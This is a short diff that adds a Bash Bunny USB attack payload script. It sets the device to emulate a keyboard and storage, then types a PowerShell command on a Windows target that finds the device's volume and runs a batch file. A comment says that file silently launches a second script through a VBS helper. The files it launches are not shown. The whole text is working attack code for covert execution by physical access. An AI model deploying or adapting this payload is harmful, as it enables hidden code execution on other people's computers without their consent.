@@ -1,0 +1,6 @@
+# Executes a.cmd from the switch position's folder, which uses i.vbs to launch b.cmd silently
+GET SWITCH_POSITION
+LED ATTACK
+ATTACKMODE HID STORAGE
+RUN WIN powershell ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\a.cmd')"
+LED FINISH
